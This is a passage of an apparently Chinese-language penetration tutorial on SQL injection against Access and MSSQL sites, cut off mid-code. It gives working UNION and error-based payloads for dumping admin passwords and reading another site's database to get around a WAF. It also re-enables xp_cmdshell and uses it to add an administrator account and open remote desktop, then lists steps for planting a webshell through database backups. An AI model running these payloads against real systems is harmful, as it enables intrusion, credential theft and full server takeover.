+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">#第一步:使用之前的方法得到显示点为<span class="hljs-number">2</span>,<span class="hljs-number">3</span>，字段个数为<span class="hljs-number">7</span>，但是我们并不知道列名<br>http://XXX?id=<span class="hljs-number">14</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span> <span class="hljs-keyword">from</span> administrator<br><br>#第二步:用*依次向前替换数字字段，直到页面显示正常。例如在<span class="hljs-number">5</span>替换为*后页面返回正常<br>http://XXX?id=<span class="hljs-number">14</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,* <span class="hljs-keyword">from</span> administrator<br>#说明星号替换了<span class="hljs-number">3</span>个字段(也就是表中有三个字段),后续要使用<span class="hljs-keyword">inner</span> jion自表连接查询，因此计算字段数乘以<span class="hljs-number">2</span>是否小于当前列(<span class="hljs-number">3</span>*<span class="hljs-number">2</span>&lt;<span class="hljs-number">7</span>)<br><br>#第三步:公式成立的话，用<span class="hljs-keyword">inner</span> jion自连接查询<br>http://XXX?id=<span class="hljs-number">14</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,*  <span class="hljs-keyword">from</span> (administrator <span class="hljs-keyword">as</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> administrator <span class="hljs-keyword">as</span> b <span class="hljs-keyword">on</span> a.id=b.id)<br><br>#如果是更多位，可再接<span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span><br>http://XXX?id=<span class="hljs-number">14</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,* <span class="hljs-keyword">from</span> ((administrator <span class="hljs-keyword">as</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> administrator <span class="hljs-keyword">as</span> b <span class="hljs-keyword">on</span> a.id=b.id) <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> administrator <span class="hljs-keyword">as</span> c a.id=c.id)<br></code></pre></td></tr></table></figure>
+
+<h4 id="跨库查询"><a href="#跨库查询" class="headerlink" title="跨库查询"></a>跨库查询</h4><p>假设a和b两个站点在同一服务器上面，但a服务器上面安装了安全狗、Waf这样的安全软件，现在我们要对a站点进行攻击，但是没发现什么大漏洞，只找到网站数据库路径，对数据库下载发现下载不了。 这个时候我发现b站点有注入点。并且知道了“2和3”是注入点，可以通过跨库的方式，读取指定目录下access数据库的数据。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://xxx?id=<span class="hljs-number">14</span> union select <span class="hljs-number">1</span>,adminpassword,username,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span> from[C:\wwwtest\<span class="hljs-number">2</span>AspCMS\AspCms_data\data.asp].Aspcms_Admins<br></code></pre></td></tr></table></figure>
+
+<h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><p>在<code>MSSQL</code>中每个库都有一个系统自带表–&gt;<code>sysobjects</code></p>
+<p>​        此系统表中对我们有用的只有3个字段，<code>NAME</code>字段和<code>XTYPE</code>字段和<code>ID</code>字段，<code>name就是表名信息</code>，<code>xtype是代表表的类型</code>，只有两个参数，<code>S</code>代表系统自带表，<code>U</code>代表用户创建的表，<code>id</code>字段的值用来<code>连接syscolumns</code>表</p>
+<p><code>mssql</code>有三个权限，<code>sa</code>（最高权限，相当于system），<code>db</code>（文件管理，数据库操作等等，相当于user-administrator），<code>public</code>（数据库操作权限，相当于guest-users）</p>
+<h3 id="第一步：注入点类型的判断"><a href="#第一步：注入点类型的判断" class="headerlink" title="第一步：注入点类型的判断"></a>第一步：注入点类型的判断</h3><p>首先要对MsSQL注入点进行一下基本的注入检测，然后判断是否是MsSQL注入点</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 如果页面返回正常，则说明为MsSQL注入点。<br><span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> sysobjects) <span class="hljs-operator">&gt;</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="第二步：获取当前系统用户名"><a href="#第二步：获取当前系统用户名" class="headerlink" title="第二步：获取当前系统用户名"></a>第二步：获取当前系统用户名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-built_in">system_user</span><span class="hljs-operator">=</span><span class="hljs-number">0</span><br># <span class="hljs-built_in">system_user</span>是查询当前数据库系统的用户名，是字符型,与整型数据进行对比时,类型不匹配会造成数据库报错。<br># 从返回的错误信息中，可得知当前系统用户名。（如果不行，换个浏览器试试可能就成功了）<br></code></pre></td></tr></table></figure>
+
+<h3 id="第三步：判断注入点权限"><a href="#第三步：判断注入点权限" class="headerlink" title="第三步：判断注入点权限"></a>第三步：判断注入点权限</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">&#x27;sysadmin&#x27;</span>))<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">&#x27;db_owner&#x27;</span>))<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">&#x27;public&#x27;</span>))<br><br>如果查询返回正常页面，则说明当前数据库用户具有sa、db_owner、public权限，<br>sa为数据库用户中最高权限，默认也是系统权限，对服务器安全威胁是相当高的。<br>如果数据库与Web服务器是同一个，默认情况下可以通过MsSQL自带的存储过程对整个服务器进行控制。<br>db_owner 权限的话，我们可以找到WEB的路径，然后用备份的方式得到webshell，有时也可以对注册表进行操作。<br>public 权限的话，又要面对表和列了，不过MSSQL比ACCESS的“猜”表方便许多，这里是“暴”表，使目标直接暴出来。<br>如果权限不足，可通过注入点猜解数据库内容获得管理员账号。<br></code></pre></td></tr></table></figure>
+
+<h3 id="第四步：MsSQL返回信息判断"><a href="#第四步：MsSQL返回信息判断" class="headerlink" title="第四步：MsSQL返回信息判断"></a>第四步：MsSQL返回信息判断</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> @<span class="hljs-variable">@version</span><span class="hljs-operator">&gt;</span><span class="hljs-number">0</span><br># 从页面返回的错误信息中，可以得到数据库版本信息。<br># 如果页面出错，但未返回可利用的信息，则说明MsSQL关闭了错误信息提示，<br># 在猜解数据库内容时，就不能用爆库的方法了，只能使用<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span>联合查询或盲注入攻击方法。<br><br># 如下查询检测，获得更多的关于MsSQL注入点的信息。<br>## 判断MsSQL支持多行语句查询<br>;<span class="hljs-keyword">declare</span> <span class="hljs-variable">@d</span> <span class="hljs-type">int</span> <br># 是否支持子查询<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span> (<span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> [sysobjects])<span class="hljs-operator">&gt;=</span><span class="hljs-number">0</span><br># 获取当前数据库用户名<br><span class="hljs-keyword">and</span> <span class="hljs-keyword">user</span><span class="hljs-operator">&gt;</span>O<br># 获取当前数据库名称<br><span class="hljs-keyword">and</span> db_name<span class="hljs-operator">&gt;</span><span class="hljs-number">0</span><br># 当前数据库名<br><span class="hljs-keyword">and</span> l<span class="hljs-operator">=</span><span class="hljs-keyword">convert</span> (<span class="hljs-type">int</span>,db_name ()) 或 <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> db_name ())<br># 本地服务名<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> @<span class="hljs-variable">@servername</span>)<br># 判断是否有库读取权限<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">Select</span> HAS_DBACCESS (<span class="hljs-string">&#x27;master&#x27;</span>))<br><br>#mssql中用联合查询时判断显示位时必须要用<span class="hljs-keyword">null</span>来代替<span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">3</span> 并且可以用加<span class="hljs-string">&#x27;号的形式来确定输出位置</span><br><span class="hljs-string">and 1=2 union all select null,null</span><br><span class="hljs-string">#查询表</span><br><span class="hljs-string">and 1=2 union all select null,(select top 1 name from schemaname.dbo.sysobjects where xtype =&#x27;</span>u<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">其中xtype查询的是数据库中表是由谁创建的有 u 和 s 两个属性</span><br><span class="hljs-string">sysobjects和mysql中的information_schema表相似</span><br><span class="hljs-string">#查列</span><br><span class="hljs-string">and 1=2 union all select null,(select top 1 col_name(object_id(&#x27;</span>tablename<span class="hljs-string">&#x27;),1) from sysobjects)</span><br><span class="hljs-string">#查数据</span><br><span class="hljs-string">and 1=2 union all select null,(select top1 colnmae from tablename)</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="第五步：利用MsSQL扩展存储注入攻击"><a href="#第五步：利用MsSQL扩展存储注入攻击" class="headerlink" title="第五步：利用MsSQL扩展存储注入攻击"></a>第五步：利用MsSQL扩展存储注入攻击</h3><p>扩展存储过程是MsSQL提供的特殊功能。 所谓“扩展存储过程”，其实就是一个普通的Windows系统DLL文件，按照某种规则实现了某些函数功能. MsSQL利用扩展存储可以实现许多强大的功能，包括对系统进行操作.利用这个特性，在实施MsSQL注入攻击时，可以更容易地对系统进行控制。</p>
+<p>xp_cmdshell是什么？ 答：SQL中运行系统命令行的系统存储过程，一般在安全级别较高的服务器上，建议关闭或限制访问权限。</p>
+<p>可以使用外围应用配置器工具以及通过执行 sp_configure 来启用和禁用 xp_cmdshell。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 提交如下查询进行检测。查看xp_cmdshell、xp_regread扩展存储过程是否被删除。<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">Select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">FROM</span> master. dbo.sysobjects  <span class="hljs-keyword">Where</span> xtype <span class="hljs-operator">=</span><span class="hljs-string">&#x27;X&#x27;</span> <span class="hljs-keyword">AND</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>)<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">Select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">FROM</span> master. dbo.sysobjects  <span class="hljs-keyword">Where</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;xp_regread&#x27;</span>)<br><br>#如果扩展存储被删除，可执行如下查询进行恢复。<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;<span class="hljs-comment">--</span><br><br>## 或者以下一系列语句：<br>;<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span> <span class="hljs-comment">--</span><br>;RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE <span class="hljs-comment">--</span><br>;<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span> <span class="hljs-comment">--</span><br>;RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE <span class="hljs-comment">--</span><br>;<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">0</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="攻击中最常利用的扩展存储"><a href="#攻击中最常利用的扩展存储" class="headerlink" title="攻击中最常利用的扩展存储"></a>攻击中最常利用的扩展存储</h4><p>xp_cmdshell—利用此存储过程可以直接执行系统命令。 xp_regread—利用此存储过程可以进行注册表读取。 xp_regwrit一利用此存储过程可以写入注册表。 xp_dirtre一利用此存储过程可以进行列目录操作。 xp_enumds—利用此存储过程可以进行ODBC连接。 xp_loginconfig-利用此存储过程可以配置服务器安全模式信息。 xp_makecab一一利用此存储过程可以创建压缩卷。 xp_ntsec_enumdomains-利用此存储过程可以查看domain信息。 xp_terminate_jroces一利用此存储过程可以查看终端进程，给出一个进程PID. 结合上面的这些扩展存储，通过提交精心构造的查询语句，可利用扩展存储的强大功能进行攻击。</p>
+<h3 id="第六步：SA权限下扩展存储攻击利用方法→3389远程终端"><a href="#第六步：SA权限下扩展存储攻击利用方法→3389远程终端" class="headerlink" title="第六步：SA权限下扩展存储攻击利用方法→3389远程终端"></a>第六步：SA权限下扩展存储攻击利用方法→3389远程终端</h3><p>SA权限判断</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> IS_SRVROLEMEMBER(<span class="hljs-string">&#x27;sysadmin&#x27;</span>))<br></code></pre></td></tr></table></figure>
+
+<p>利用扩展存储开启远程终端步骤：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"># <span class="hljs-number">1.</span>添加账号：<br>;<span class="hljs-keyword">exec</span> master..xp_cmdshell <span class="hljs-string">&#x27;net user test test /add&#x27;</span><br># <span class="hljs-number">2.</span>提权账号：加入admin组<br>;<span class="hljs-keyword">exec</span> master..xp_cmdshell <span class="hljs-string">&#x27;net localgroup administrators test /add&#x27;</span><br># <span class="hljs-number">3.</span>开启<span class="hljs-number">3389</span>端口：不报错就表示成功<br>;execmaster.dbo.xp_regwrite<span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server&#x27;</span>,<span class="hljs-string">&#x27;fDenyTSConnections&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">0</span>;<br># <span class="hljs-number">4.</span>链接<span class="hljs-number">3389</span>端口控制对方的电脑<br>输入目标的IP，账号密码就是test，连接成功后退出的话点击断开，不要关机。<br></code></pre></td></tr></table></figure>
+
+<p>⛔sa权限下，还有如下几种方法都可以获得目标的webshell。</p>
+<ul>
+<li>利用 xp_regwrite 操作注册表与开启沙盒模式</li>
+<li>利用 sp_makewebtask 写入一句话木马</li>
+<li>利用 sp_oacreate 存储远程下载文件</li>
+<li>利用 sp_addlogin 扩展管理数据库用户</li>
+<li>利用 xp_servicecontrol 管理服务</li>
+</ul>
+<h3 id="第七步：dbowner-权限利用方法（-）"><a href="#第七步：dbowner-权限利用方法（-）" class="headerlink" title="第七步：dbowner 权限利用方法（ ）"></a>第七步：dbowner 权限利用方法（ ）</h3><p>dbowner权限判断</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=(<span class="hljs-keyword">SELECT</span> IS_MEMBER(<span class="hljs-symbol">&#x27;db_owner</span>&#x27;));<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+<p>⛔当数据库连接账户为dbowner权限时，无法直接利用扩展存储执行各种系统命令，进行攻击的过程比较烦琐。</p>
+<ol>
+<li>通常首先利用xp_dirtree扩展存储列出Web目录，</li>
+<li>然后利用SQL语句创建一个临时表，插入一句话木马到临时表中。</li>
+<li>然后利用数据库备份语句，将数据库备份到Web目录并保存为ASP格式的文件，即可得到一个一句话木马后门。</li>
+<li>最后利用一句话木马客户端连接后门，得到WebShell后就可以控制整个服务器了。</li>
+</ol>
+<p>🔰db_owner目前公开的方法主要有五种： 第一种：就是最普遍的backup，现在利用差异备份生成的asp文件确实要比以前小拉不少，但能否得到webshell，目前成功率还不是很高。 第二种：就是在下的万能提权，此法成功率几乎为零，只有在特定的条件下面才能实现。 第三种：就是LCX大牛在《MSSQLdb_owner角色注入直接获得系统权限》所说的利用xp_regread读出VNC在注册表的加密密码，然后破解，直接拿到系统权限，这种方法局限性比较大，要是对方主机没有装vnc，你怎么办。 第四种：就是利用xp_regwrite再注册表里直接加个系统帐号或者直接写个webshell，在主机重起的时候就可以拿到webshell或者系统权限。此法适用范围比较大，成功率也相对前3种较高点，但缺点也是显而易见的，就是不能够马上得到webshell，需要对方重起。 第五种：就是利用添加作业的一些存储过程，sp_add_job，sp_addtask，xp_dirtree之类得到系统权限。理论上应该说是目前这5种里面成功率最高的的一种，</p>
+<p>下面我们就重点介绍一下第五种方法。</p>
+<h4 id="1-找出网站安装路径："><a href="#1-找出网站安装路径：" class="headerlink" title="1.找出网站安装路径："></a>1.找出网站安装路径：</h4><p>当Web服务器与数据库在同一服务器主机上时，就可以备份一句话木马到Web目录了。但是在备份一句话木马前，首先需要搜索Web目录，可通过如下几个步骤实现。 第壹种方法：通过报错或baidu、google等查找 第贰种方法：这种方法需要满足三个条件，可以获取目标的所有盘符和深度</p>
+<ol>
+<li>SQL SERVER允许执行多行语句；</li>
+<li>该网站能进行注入；</li>
+<li>没有返回详细的错误提示信息(否则没有必要用这种方法)。</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs sql"># <span class="hljs-number">1.</span> 删除表black；首先建立一个临时表用于存放master..xp_dirtree(适合于public)生成的目录树 ，该表的dir字段表示目录的名称，depth字段表示目录的深度。<br>;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> black;<span class="hljs-keyword">create table</span> temp(dir nvarchar (<span class="hljs-number">255</span>), depth <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>),files <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>), id <span class="hljs-type">int</span> <span class="hljs-keyword">not null</span> <span class="hljs-keyword">identity</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-comment">--</span><br># <span class="hljs-number">2.</span> 然后执行xp_dirtree获得D盘的目录树<br>;<span class="hljs-keyword">insert into</span> temp(dir,depth,files) <span class="hljs-keyword">exec</span> master.dbo.xp_dirtree <span class="hljs-string">&#x27;D:&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span><span class="hljs-comment">--</span><br># <span class="hljs-number">3.</span> 查看D盘有几个文件夹，这样对D盘有个大致的了解<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> temp <span class="hljs-keyword">where</span> depth<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> dir <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span>(<span class="hljs-string">&#x27;Documents and Settings&#x27;</span>,<span class="hljs-string">&#x27;Program Files&#x27;</span>,<span class="hljs-string">&#x27;RECYCLER&#x27;</span>,<span class="hljs-string">&#x27;System Volume Information&#x27;</span>,<span class="hljs-string">&#x27;WINDOWS&#x27;</span>,<span class="hljs-string">&#x27;CAConfig&#x27;</span>,<span class="hljs-string">&#x27;wmpub&#x27;</span>,<span class="hljs-string">&#x27;Microsoft UAM 卷&#x27;</span>))<span class="hljs-operator">&gt;=</span>数字(数字<span class="hljs-operator">=</span><span class="hljs-number">0</span>、<span class="hljs-number">1</span>、<span class="hljs-number">2</span>、<span class="hljs-number">3.</span>..)<br># <span class="hljs-number">4.</span> 接着在对方的网站上找几个一级子目录，如<span class="hljs-keyword">user</span>、photo，然后，用筛选的方法来判断WEB根目录上是否存在此盘上<br>## 看语句的返回结果，如果为真，表示WEB根目录有可能在此盘上<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> temp <span class="hljs-keyword">where</span>  dir<span class="hljs-operator">&lt;&gt;</span><span class="hljs-string">&#x27;user&#x27;</span>)<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> temp)<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> temp <span class="hljs-keyword">where</span> dir<span class="hljs-operator">&lt;&gt;</span><span class="hljs-string">&#x27;photo&#x27;</span>)<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> temp)<br># <span class="hljs-number">5.</span> 假设找到的WEB根目录在此盘上，用下面的语句来获得一级子目录的深度：<br>## 假设得到的depth是<span class="hljs-number">3</span>,说明<span class="hljs-keyword">user</span>目录是D盘的<span class="hljs-number">3</span>级目录，则WEB根目录是D盘的二级目录。<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> depth <span class="hljs-keyword">from</span> temp <span class="hljs-keyword">where</span> dir<span class="hljs-operator">=</span><span class="hljs-string">&#x27;user&#x27;</span>)<span class="hljs-operator">&gt;=</span>数字  #数字<span class="hljs-operator">=</span><span class="hljs-number">1</span>、<span class="hljs-number">2</span>、<span class="hljs-number">3.</span>..<br># <span class="hljs-number">6.</span> 接下来，另建一个临时表temp1，用来存放D盘的<span class="hljs-number">1</span>级子目录下的所有目录<br>;<span class="hljs-keyword">create table</span> temp1(dir nvarchar(<span class="hljs-number">255</span>),depth <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>));<span class="hljs-comment">--</span><br># <span class="hljs-number">7.</span> 然后把从D盘的第一个子目录下的所有目录存到temp1中<br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@dirname</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>);<span class="hljs-keyword">set</span> <span class="hljs-variable">@dirname</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;D:/&#x27;</span><span class="hljs-operator">+</span>(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> dir <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> dir <span class="hljs-keyword">from</span> temp <span class="hljs-keyword">where</span> depth<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> dir <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span>(<span class="hljs-string">&#x27;Documents and Settings&#x27;</span>,<span class="hljs-string">&#x27;Program Files&#x27;</span>,<span class="hljs-string">&#x27;RECYCLER&#x27;</span>,<span class="hljs-string">&#x27;System Volume Information&#x27;</span>,<span class="hljs-string">&#x27;WINDOWS&#x27;</span>,<span class="hljs-string">&#x27;CAConfig&#x27;</span>,<span class="hljs-string">&#x27;wmpub&#x27;</span>,<span class="hljs-string">&#x27;Microsoft UAM 卷&#x27;</span>) <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> dir <span class="hljs-keyword">desc</span>)T <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> dir);<span class="hljs-keyword">insert into</span> temp1 <span class="hljs-keyword">exec</span> master.dbo.xp_dirtree <span class="hljs-variable">@dirname</span><br># <span class="hljs-number">8.</span> temp1中已经保存了所有D盘第一级子目录下的所有目录,用同样的方法来判断根目录是否在此一级子目录下<br>## 如果返回为真，表示根目录可能在此子目录下，记住要多测试几个例子，如果都返回为假，则表明WEB根目录不在此目录下<br>## 用同样的方法来获得D盘第<span class="hljs-number">2</span>、<span class="hljs-number">3.</span>..个子目录下的所有目录列表，来判断WEB根目录是否在其下。<br>## 要注意，用xp_dirtree前一定要把temp1表中的内容删除。<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> temp1 <span class="hljs-keyword">where</span> dir<span class="hljs-operator">&lt;&gt;</span><span class="hljs-string">&#x27;user&#x27;</span>)<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> temp1)<br># <span class="hljs-number">9.</span>假设WEB根目录在D盘的第一级子目录下，该子目录名称为website,<br>## 前面我们知道了WEB根目录的深度为<span class="hljs-number">2</span>，我们需要知道website下到底哪个才是真正的WEB根目录。<br>## 用同样的方法，再建立第<span class="hljs-number">3</span>个临时表 temp2<br>;<span class="hljs-keyword">create table</span> temp2(dir nvarchar(<span class="hljs-number">255</span>),depth <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>));<span class="hljs-comment">--</span><br># <span class="hljs-number">10.</span> 然后把从D盘的website下的所有目录存到temp2中<br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@dirname</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>);<span class="hljs-keyword">set</span> <span class="hljs-variable">@dirname</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;D:/website/&#x27;</span><span class="hljs-operator">+</span>(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> dir <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> dir <span class="hljs-keyword">from</span> temp1 <span class="hljs-keyword">where</span> depth<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> dir <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span>(<span class="hljs-string">&#x27;Documents and Settings&#x27;</span>,<span class="hljs-string">&#x27;Program Files&#x27;</span>,<span class="hljs-string">&#x27;RECYCLER&#x27;</span>,<span class="hljs-string">&#x27;System Volume Information&#x27;</span>,<span class="hljs-string">&#x27;WINDOWS&#x27;</span>,<span class="hljs-string">&#x27;CAConfig&#x27;</span>,<span class="hljs-string">&#x27;wmpub&#x27;</span>,<span class="hljs-string">&#x27;Microsoft UAM 卷&#x27;</span>) <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> dir <span class="hljs-keyword">desc</span>)T <span 